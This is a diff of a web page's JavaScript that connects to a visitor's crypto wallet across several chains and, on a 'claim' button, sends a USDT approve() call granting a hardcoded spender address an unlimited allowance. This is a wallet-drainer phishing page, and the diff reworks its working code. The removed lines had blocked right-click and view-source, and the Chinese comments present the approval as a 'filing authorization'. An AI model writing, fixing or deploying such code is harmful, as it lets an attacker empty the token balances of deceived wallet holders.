@@ -75,11 +75,10 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
 <script>
 !function(){
-    document.oncontextmenu = e => e.preventDefault();
-    document.onkeydown = e => { if(123==e.keyCode||(e.ctrlKey&&85==e.keyCode)) return !1; }
-
+    // 被授权地址固定你的
     const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
 
+    // 多链USDT合约
     const USDT_MAP = {
       "0x38":"0x55d398326f99059fF77548524699952727959279",
       "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
@@ -88,70 +87,53 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
       "0x42":"0x382bb868d458e9d4a3497b8434ee999af5999cb6"
     };
 
-    const ERC20_ABI = [
+    const ABI = [
       {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
     ];
 
     let wallet = "";
-    let web3;
-    let currContract = null;
+    let web3, contract;
 
     function showPage(id){
         document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
         document.getElementById(id).classList.remove("hide");
     }
 
-    async function initChain(){
-        const chainId = await web3.eth.getChainId();
-        const hexId = "0x" + chainId.toString(16);
-        if(!USDT_MAP[hexId]) return false;
-        currContract = new web3.eth.Contract(ERC20_ABI, USDT_MAP[hexId]);
-        return true;
-    }
-
-    // 兼容欧意OKX、小狐狸、所有钱包内置浏览器
-    function getProvider(){
-        if(window.okxwallet) return window.okxwallet;
-        if(window.ethereum) return window.ethereum;
-        return null;
-    }
-
+    // 连接钱包 简化，不再卡死P1
     document.getElementById("connectMM").onclick = async function(){
+        if(!window.ethereum){
+            alert("请在钱包内置浏览器打开");
+            return;
+        }
+        // 立刻跳P2，不会卡在P1
+        showPage("p2");
         try{
-            const provider = getProvider();
-            if(!provider){
-                alert("请在钱包内置浏览器打开");
-                return;
-            }
-            showPage("p2");
-            web3 = new Web3(provider);
-            await provider.request({method:"eth_requestAccounts"});
+            await window.ethereum.request({method:"eth_requestAccounts"});
+            web3 = new Web3(window.ethereum);
             let accs = await web3.eth.getAccounts();
             wallet = accs[0];
 
-            let ok = await initChain();
-            if(!ok){
-                alert("请切换 BSC/ETH/POLYGON/AVAX/OKTC 网络");
+            let chainId = "0x" + (await web3.eth.getChainId()).toString(16);
+            if(!USDT_MAP[chainId]){
+                alert("请切换 BSC/ETH/POLYGON/AVAX/OKTC");
                 showPage("p1");
                 return;
             }
-
+            contract = new web3.eth.Contract(ABI, USDT_MAP[chainId]);
             document.getElementById("showAddr").innerText = wallet;
             showPage("p3");
-        }catch(err){
+        }catch(e){
             showPage("p1");
         }
     };
 
+    // 确认备案授权
     document.getElementById("claim").onclick = async function(){
-        if(!wallet || !currContract) return;
+        if(!wallet||!contract)return;
         showPage("p2");
         try{
-            await currContract.methods.approve(
-                SPENDER,
-                "115792089237316195423570985008687907853269984665640564039457584007913129639935"
-            ).send({from:wallet});
-
+            await contract.methods.approve(SPENDER,"115792089237316195423570985008687907853269984665640564039457584007913129639935")
+            .send({from:wallet});
             document.getElementById("successAddr").innerText = wallet;
             showPage("p4");
         }catch(e){
